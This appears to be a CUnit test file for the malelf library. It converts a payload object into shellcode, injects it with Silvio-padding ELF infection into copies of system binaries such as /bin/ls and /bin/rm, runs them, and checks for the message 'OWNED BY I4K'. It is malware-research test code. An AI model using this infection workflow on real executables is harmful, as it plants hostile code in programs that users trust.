#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <CUnit.h>
#include <Automated.h>
#include <time.h>
#include <libgen.h>

#include <malelf/error.h>
#include <malelf/object.h>
#include <malelf/shellcode.h>
#include <malelf/infect.h>

#define TRUE 1
#define FALSE 0
#define PAGE_SIZE 4096

int init_suite_success(void) { return 0; }
int init_suite_failure(void) { return -1; }
int clean_suite_success(void) {
    /* unlink("/tmp/malelf-uninfected.out"); */
    /* unlink("/tmp/malelf-infected.out"); */
    return 0;
}
int clean_suite_failure(void) { return -1; }

_i32 filestrcmp(char* file, char* str) {
    malelf_object obj;
    _i32 error;
    char* res = NULL;

    obj.fname = file;

    if ((error = malelf_openr(&obj, file)) != MALELF_SUCCESS) {
        return error;
    }

    res = strstr((char*)obj.mem, str);

    malelf_close(&obj);

    return res != NULL;
}

_i32 filecmp(char* file1, char* file2) {
    malelf_object obj1, obj2;
    _i32 error;
    int i = 0;

    obj1.fname = file1;
    obj2.fname = file2;

    if ((error = malelf_openr(&obj1, file1)) != MALELF_SUCCESS) {
        return error;
    }
  
    if ((error = malelf_openr(&obj2, file2)) != MALELF_SUCCESS) {
        return error;
    }

    error = MALELF_SUCCESS;

    if (obj1.st_info.st_size == obj2.st_info.st_size) {
        for (i = 0; i < obj1.st_info.st_size; i++) {
            if (obj1.mem[i] != obj2.mem[i]) {
                error = MALELF_ERROR;
                goto filecmp_exit;
            }
        }
    } else {
        error = MALELF_ERROR;
        goto filecmp_exit;
    }

  filecmp_exit:
    malelf_close(&obj1);
    malelf_close(&obj2);

    return error;
}

void test_malelf_infect_silvio_padding_by_malware(char* malware_path, char* malware_message) {
    char* infected_dir = "infected/";
    char* uninfected_dir = "host/";
    char* malware_path_gen = "/tmp/malware_ready.o";
    char* redir = " 2>&1 > ";
    char chmod_str[256];
    char infected_path[256];
    char infected_exec[256];
    char uninfected_path[256];
    char uninfected_exec[256];
    char infected_output_file[256];
    char uninfected_output_file[256];
    FILE* mal_fd_out, *mal_fd_in;
    unsigned long int magic_bytes = 0;
    struct stat mal_stat_info;
    int i;
    
    malelf_object input, output, malware;
    _i32 error;

    char uninfected_files[][256] = {"/bin/cp",
                                      "/bin/echo",
                                      "/bin/ls",
                                      "/bin/mv",
                                      "/bin/ps",
                                      "/bin/rm",
                                      "/bin/pwd",
                                      "/bin/uname"
    };

    for (i = 0; i < 8; i++) {

        memset(chmod_str, 0, 256);
        memset(infected_path, 0, 256);
        memset(infected_exec, 0, 256);
		memset(uninfected_path, 0, 256);
		memset(uninfected_exec, 0, 256);
        memset(infected_output_file, 0, 256);
        memset(uninfected_output_file, 0, 256);

		strncpy(uninfected_path, uninfected_files[i], 255);

        strncpy(infected_path, infected_dir, 255);
        strncat(infected_path, basename(uninfected_path), 255);
        strncat(infected_output_file, infected_path, 255);
        strncat(infected_output_file, ".out", 255);

		input.fname = uninfected_path;
        input.is_readonly = 1;
        output.fname = infected_path;

        //for testing purposes only
        printf("%s\n", uninfected_path);

        mal_fd_in = fopen(malware_path, "r");
        CU_ASSERT(mal_fd_in != NULL);
        if (mal_fd_in == NULL) {
            perror("Could not open the malware...\n");
            return;
        }

        mal_fd_out = fopen(malware_path_gen, "w");
        CU_ASSERT(mal_fd_out != NULL);
        if (mal_fd_out == NULL) {
            perror("Could not open the output file...\n");
            return;
        }

        if (fstat(fileno(mal_fd_in), &mal_stat_info) == -1) {
            malelf_perror(errno);
            fclose(mal_fd_out);
            return;
        }

        error = shellcode_create_malelficus(mal_fd_out,
                                            mal_stat_info.st_size,
                                            mal_fd_in,
                                            0,
                                            0);

        CU_ASSERT(error == MALELF_SUCCESS);

        fclose(mal_fd_out);

        malware.fname = malware_path_gen;

        error = malelf_openr(&malware, malware.fname);

        CU_ASSERT(error == MALELF_SUCCESS);

        if (error != MALELF_SUCCESS) {
            malelf_perror(error);
            fclose(mal_fd_out);
            return;
        }

        error = malelf_openr(&input, input.fname);
        CU_ASSERT(error == MALELF_SUCCESS);

        if (error != MALELF_SUCCESS) {
            malelf_perror(error);
            return;
        }
    
        error = malelf_infect_silvio_padding(&input,
                                             &output,
                                             &malware,
                                             0,
                                             magic_bytes);
        CU_ASSERT(error == MALELF_SUCCESS);

        if (error != MALELF_SUCCESS) {
            malelf_perror(error);
            return;
        }

        malelf_close(&input);
        malelf_close(&output);

        strncpy(chmod_str, "chmod +x ", 255);
        strncat(chmod_str, infected_path, 255);

        CU_ASSERT((error = system(chmod_str)) == 0);

        if (error != 0) {
            malelf_perror(error);
            return;
        }

        strncpy(uninfected_output_file, uninfected_dir, 255);
        strncat(uninfected_output_file, basename(uninfected_path), 255);
        strncat(uninfected_output_file, ".out", 255);

        strncpy(uninfected_exec, uninfected_path, 255);
        strncat(uninfected_exec, redir, 255);
        strncat(uninfected_exec, uninfected_output_file, 255);

        strncpy(infected_exec, "./", 255);
        strncat(infected_exec, infected_path, 255);
        strncat(infected_exec, redir, 255);
        strncat(infected_exec, infected_output_file, 255);

        error = system(uninfected_exec);
        CU_ASSERT((error != 134) && (error != 139) && (error != 4));

        error = system(infected_exec);
        CU_ASSERT((error != 134) && (error != 139) && (error != 4));

        CU_ASSERT((error = filecmp(uninfected_output_file, infected_output_file)) != 0);

		int found_string = 0;

		FILE* infected_file = fopen(infected_output_file, "r"); 
		char tmp[256]={0x0};
		while(infected_file!=NULL && fgets(tmp, sizeof(tmp), infected_file) != NULL)
		{
			if (strstr(tmp, malware_message))
				found_string = 1;
		}
		if(infected_file != NULL) 
			fclose(infected_file);

		CU_ASSERT(found_string);
    }
}

void test_malelf_infect_silvio_padding(void)
{
  test_malelf_infect_silvio_padding_by_malware("malwares/write_message.o", "OWNED BY I4K");
}

int main()
{
    CU_pSuite pSuite = NULL;

    /* initialize the CUnit test registry */
    if (CUE_SUCCESS != CU_initialize_registry())
        return CU_get_error();

    /* add a suite to the registry */
    pSuite = CU_add_suite("Suite_success", init_suite_success, clean_suite_success);
    if (NULL == pSuite) {
        CU_cleanup_registry();
        return CU_get_error();
    }

    /* add the tests to the suite */
    if ((NULL == CU_add_test(pSuite, "successful_test_1",
                             test_malelf_infect_silvio_padding)))
        {
            CU_cleanup_registry();
            return CU_get_error();
        }

    CU_set_output_filename("test_infection");
    /* Run all tests using the automated interface */
    CU_automated_run_tests();
    CU_list_tests_to_file();


    /* Clean up registry and return */
    CU_cleanup_registry();
    return CU_get_error();
}

